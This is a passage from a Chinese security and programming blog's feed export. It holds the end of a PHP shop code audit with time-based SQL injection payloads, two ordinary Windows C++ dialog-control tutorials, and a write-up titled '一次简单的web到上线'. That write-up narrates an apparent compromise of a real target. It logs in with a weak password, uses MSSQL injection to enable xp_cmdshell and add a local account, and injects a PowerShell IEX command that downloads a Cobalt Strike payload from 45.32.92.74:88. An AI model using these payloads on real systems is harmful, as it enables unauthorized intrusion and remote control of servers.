直接构造</p><p><em>payload：{“act”:”suv”,”uid”:”1”,”sid”:”zC1fEUcZ0CZAHAde”,”ID”:”1||sleep(5)”,”Nm”:”12653”,”Nc”:”123”,”Np”:”123”,”Ne”:0,”Nv”:0}</em></p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/22.png" alt="22"></p><blockquote><p>延时注入一枚</p></blockquote><h3 id="第三处"><a href="#第三处" class="headerlink" title="第三处"></a>第三处</h3><blockquote><p>通过审计工具找到员工删除这里</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/23.png" alt="23"></p><blockquote><p>员工删除的地方 没有单引号等保护或者过滤<br>直接先来到员工管理页面</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/24.png" alt="24"></p><blockquote><p>因为是本地搭建的原因 有些无法显示 但不影响 我们操作 因为删除 和添加 也只是参数不一样嘛 直接先添加员工 然后抓包</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/25.png" alt="25"></p><blockquote><p>Sav是员工保存的包 我们把它改为sad</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/26.png" alt="26"></p><blockquote><p>然后因为这里没有防护 直接构造</p><p><em>payload：{“act”:”sad”,”uid”:”1”,”sid”:”zC1fEUcZ0CZAHAde”,”ID”:0||sleep(5),”Nm”:”123”,”Np”:”123”,”Nr”:””}</em></p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/27.png" alt="27"></p><blockquote><p>放包 但是发现报错了 不要紧 我们全局搜索下这个报错</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/28.png" alt="28"></p><blockquote><p>发现是在json解码的时候报错了 回来在看数据包 发现没有添加引号 所以报错了 我们加上在试试</p></blockquote><blockquote><p>Payload：{“act”:”sad”,”uid”:”1”,”sid”:”zC1fEUcZ0CZAHAde”,”ID”:”0||sleep(5)”,”Nm”:”123”,”Np”:”123”,”Nr”:””}</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/29.png" alt="29"></p><blockquote><p>成功延时</p></blockquote><h3 id="第四处"><a href="#第四处" class="headerlink" title="第四处"></a>第四处</h3><blockquote><p>找到一个运费删除的地方  和上面的差不多 都是通过case 判断进入</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/30.png" alt="30"></p><blockquote><p>这里和上面同理 直接改掉act的值为syd<br>然后放包</p></blockquote><p><img src="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/31.png" alt="31"></p><blockquote><p>延时成功<br>后续还有优惠删除等 删除的操作 都有这个问题 没有给单引号保护以及过滤 都可以延时注入</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows编程通用控件</title>
    <link href="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/"/>
    <url>/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p><img src="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/1.png" alt="1"></p><blockquote><p>进度条和滑块控件</p></blockquote><p><img src="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/2.png" alt="2"></p><p><img src="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/3.png" alt="3"></p><p><img src="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/4.png" alt="4"></p><p><img src="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/5.png" alt="5"></p><p><img src="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/6.png" alt="6"></p><p><img src="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/7.png" alt="7"></p><p><img src="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/8.png" alt="8"></p><p><img src="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/9.png" alt="9"></p><blockquote><p>运行</p></blockquote><p><img src="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/10.png" alt="10"></p><blockquote><p>用滑块控制进度条</p></blockquote><p><img src="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/11.png" alt="11"></p><p><img src="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/12.png" alt="12"></p><p><img src="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/13.png" alt="13"></p><p><img src="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/14.png" alt="14"></p><p><img src="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/15.png" alt="15"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;CommCtrl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&quot;resource.h&quot;</span></span><br><span class="hljs-function">INT_PTR CALLBACK <span class="hljs-title">Dlgproc</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HWND hwnd,</span></span><br><span class="hljs-params"><span class="hljs-function">UINT uMsg,</span></span><br><span class="hljs-params"><span class="hljs-function">WPARAM wParam,</span></span><br><span class="hljs-params"><span class="hljs-function">LPARAM lParam</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (uMsg)<br>&#123;<br><span class="hljs-keyword">case</span> WM_INITDIALOG:<br>&#123;<br><span class="hljs-built_in">SendDlgItemMessageW</span>(hwnd, IDC_PROGRESS1,PBM_SETRANGE,<span class="hljs-number">0</span>,<span class="hljs-built_in">MAKELPARAM</span>(<span class="hljs-number">0</span>,<span class="hljs-number">100</span>));<br><span class="hljs-built_in">SendDlgItemMessageW</span>(hwnd, IDC_SLIDER1, TBM_SETRANGE, TRUE, <span class="hljs-built_in">MAKELPARAM</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>));<br><span class="hljs-built_in">SendDlgItemMessageW</span>(hwnd, IDC_PROGRESS1, PBM_SETPOS, <span class="hljs-number">50</span>, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">SendDlgItemMessageW</span>(hwnd, IDC_SLIDER1, TBM_SETPOS, TRUE, <span class="hljs-number">80</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> WM_CLOSE:<br>&#123;<br><span class="hljs-built_in">EndDialog</span>(hwnd, <span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-keyword">case</span> WM_HSCROLL:<br>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">GetDlgItem</span>(hwnd, IDC_SLIDER1)==(HWND)lParam)<br>&#123;<br><span class="hljs-keyword">int</span> pos = <span class="hljs-built_in">SendMessageW</span>((HWND)lParam,TBM_GETPOS,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br><span class="hljs-built_in">SendDlgItemMessageW</span>(hwnd, IDC_PROGRESS1,PBM_SETPOS,pos,<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> WINAPI <span class="hljs-title">WinMain</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hPrevInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">LPSTR     lpCmdLine,</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span>       nShowCmd</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">DialogBoxW</span>(hInstance, <span class="hljs-built_in">MAKEINTRESOURCEW</span>(IDD_DIALOG1),<span class="hljs-literal">NULL</span>, Dlgproc);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows编程控件的使用</title>
    <link href="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="控件的使用"><a href="#控件的使用" class="headerlink" title="控件的使用"></a>控件的使用</h2><p><img src="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/1.png" alt="1"></p><p><img src="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/2.png" alt="2"></p><blockquote><p>复选框和单选框的创建</p></blockquote><blockquote><p><strong>DialogBoxW 用这个函数创建对话框</strong></p></blockquote><p><img src="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/3.png" alt="3"></p><blockquote><p>标题可以通过这样修改标题</p></blockquote><blockquote><p>然后添加几个多选框和点选框</p></blockquote><p><img src="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/4.png" alt="4"></p><blockquote><p>直接ctrl+D  可以看见都是标了序号的 然后看见这个单选框</p></blockquote><p><img src="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/5.png" alt="5"></p><blockquote><p>随便选一个右键属性</p></blockquote><p><img src="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/6.png" alt="6"></p><blockquote><p>有一个组的属性  值是FALSE   这几个单选框的组属性都是false  所以目前这几个都是一组的  但是如果把喜欢 和不确定改为 true之后   </p></blockquote><p><img src="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/7.png" alt="7"></p><blockquote><p>不确定和上面的就不是一组的了    从喜欢往下数   直到遇到一个为true的 才分为另一组  </p></blockquote><blockquote><p>在启动的时候默认选择一个多选框</p></blockquote><p><img src="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/8.png" alt="8"></p><p><img src="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/9.png" alt="9"></p><p><img src="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/10.png" alt="10"></p><p><img src="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/11.png" alt="11"></p><blockquote><p>这个函数可以直接代替上面两行</p></blockquote><p><img src="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/12.png" alt="12"></p><blockquote><p>获取选中的状态</p></blockquote><p><img src="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/13.png" alt="13"></p><p><img src="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/14.png" alt="14"></p><p><img src="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/15.png" alt="15"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;CommCtrl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&quot;resource.h&quot;</span></span><br><br><span class="hljs-function">INT_PTR CALLBACK <span class="hljs-title">Dlgproc</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HWND hwnd,</span></span><br><span class="hljs-params"><span class="hljs-function">UINT uMsg,</span></span><br><span class="hljs-params"><span class="hljs-function">WPARAM wParam,</span></span><br><span class="hljs-params"><span class="hljs-function">LPARAM lParam</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (uMsg)<br>&#123;<br><span class="hljs-keyword">case</span> WM_INITDIALOG:<br>&#123;<br><span class="hljs-comment">/*HWND hcheck1 = GetDlgItem(hwnd, IDC_CHECK1);</span><br><span class="hljs-comment">SendMessageW(hcheck1,BM_SETCHECK,BM_GETCHECK,0);*/</span><br><span class="hljs-comment">//SendDlgItemMessageW(hwnd, IDC_CHECK1, BM_SETCHECK, BM_GETCHECK,0);</span><br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> WM_CLOSE:<br>&#123;<br><span class="hljs-built_in">EndDialog</span>(hwnd, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> WM_COMMAND:<br>&#123;<br>WORD ControlId = <span class="hljs-built_in">LOWORD</span>(wParam);<br><span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (ControlId)<br>&#123;<br><span class="hljs-keyword">case</span> IDC_BUTTON1:<br>&#123;<br>WCHAR buff[<span class="hljs-number">20</span>]&#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">for</span> (UINT BTNID = IDC_CHECK1; BTNID &lt;= IDC_CHECK3; BTNID++)<br>&#123;<br>UINT Checked = <span class="hljs-built_in">SendDlgItemMessageW</span>(hwnd, BTNID, BM_GETCHECK, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (Checked == BST_CHECKED) &#123;<br><span class="hljs-built_in">GetDlgItemTextW</span>(hwnd, BTNID, buff, <span class="hljs-number">20</span>);<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, buff, <span class="hljs-string">L&quot;提示&quot;</span>, MB_OK);<br>&#125;<br>&#125;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> IDC_BUTTON2:<br>&#123;<br>WCHAR buff[<span class="hljs-number">20</span>]&#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">for</span> (UINT BTNID = IDC_RADIO1; BTNID &lt;= IDC_RADIO3; BTNID++)<br>&#123;<br>UINT Checked = <span class="hljs-built_in">SendDlgItemMessageW</span>(hwnd, BTNID, BM_GETCHECK, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (Checked == BST_CHECKED) &#123;<br><span class="hljs-built_in">GetDlgItemTextW</span>(hwnd, BTNID, buff, <span class="hljs-number">20</span>);<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, buff, <span class="hljs-string">L&quot;提示&quot;</span>, MB_OK);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> WINAPI <span class="hljs-title">WinMain</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hPrevInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">LPSTR     lpCmdLine,</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span>       nShowCmd</span></span><br><span class="hljs-params"><span class="hljs-function">)</span> </span><br><span class="hljs-function"></span>&#123;<br><br><span class="hljs-built_in">DialogBoxW</span>(hInstance, <span class="hljs-built_in">MAKEINTRESOURCEW</span>(IDD_DIALOG1), <span class="hljs-literal">NULL</span>, Dlgproc);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一次简单的web到上线</title>
    <link href="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/"/>
    <url>/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/</url>
    
    <content type="html"><![CDATA[<h2 id="渗透开始"><a href="#渗透开始" class="headerlink" title="渗透开始"></a>渗透开始</h2><blockquote><p>首先来到目标的后台</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/0.png" alt="0"></p><blockquote><p>看见这种很简陋 就感觉有洞<br>试了一下弱口令 靠 直接进了</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/0.1.png" alt="0.1"></p><blockquote><p>然后通过改包  也是可以登录的</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/1.png" alt="1"></p><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/2.png" alt="2"></p><p>改包进来然后修改账户 发现这账号有点离谱</p><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/3.png" alt="3"></p><blockquote><p>然后就开始在后台找找能不能拿shell 的地方<br>导入的地方可以上传文件</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/4.png" alt="4"></p><blockquote><p>但是只能上传excel文件</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/5.png" alt="5"></p><blockquote><p>尝试改文件后缀 结果失败了 然后继续找其他突破口</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/6.png" alt="6"></p><blockquote><p>这里有个查询的地方 然后开启抓包 因为这种查询的地方很有可能是带有参数查询的 就可能含有注入</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/7.png" alt="7"></p><blockquote><p>好家伙 这注入不久来了嘛 mssql的</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/8.png" alt="8"></p><blockquote><p>直接dba的权限<br>尝试cmdshell</p><blockquote><p><em>通过下面sql语句开启</em><br><em>xpcmd sp_configure ‘show advanced options’,</em><br><em>sp_configure ‘xp_cmdshell’,1</em></p></blockquote></blockquote><blockquote><p>尝试ping dnslog</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/9.png" alt="9"></p><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/10.png" alt="10"></p><blockquote><p>是出网的 直接尝试添加 账户 上3389</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/11.png" alt="11"></p><blockquote><p><em>selstate=0&amp;numState1_5=&amp;Remarks2=&amp;number=1’; exec master ..xp_cmdshell ‘net user test1 test1 /add’ — &amp;numState=%E5%85%A8%E9%83%A8&amp;page=1&amp;rows=500</em></p><p>扫端口发现3389是开的</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/12.png" alt="12"></p><blockquote><p>然后直接连 发现连不上 添加到用户组</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/13.png" alt="13"></p><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/14.png" alt="14"></p><blockquote><p>还是连不上 就先不管 直接上cs</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/15.png" alt="15"></p><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/16.png" alt="16"></p><blockquote><p><em>powershell.exe -nop -w hidden -c “IEX ((new-object net.webclient).downloadstring(‘</em><a href="http://45.32.92.74:88/aa*%E2%80%98))%E2%80%9D">http://45.32.92.74:88/aa*‘))”</a>*</p><p>因为存在引号这些 所以 直接编个码</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/17.png" alt="17"></p><blockquote><p>直接复制到注入的地方</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/18.png" alt="18"></p><blockquote><p>然后GO 坐等上线</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/19.png" alt="19"></p><blockquote><p>好家伙 直接来了  杀软都没有</p></blockquote><p><img src="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/20.png" alt="20"></p><blockquote><p>然后查看ip发现是内网 那刚开始3389连不上 应该就是这个情况 对方在内网 所以没连上</p></blockquote><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><blockquote><p>因为这cs服务器没用了 所以就没打码了 师傅们轻点喷 如果我有说错的地方,师傅们 轻点喷</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows对话框资源</title>
    <link href="/2021/08/27/windows%E5%AF%B9%E8%AF%9D%E6%A1%86%E8%B5%84%E6%BA%90/"/>
    <url>/2021/08/27/windows%E5%AF%B9%E8%AF%9D%E6%A1%86%E8%B5%84%E6%BA%90/</url>
    
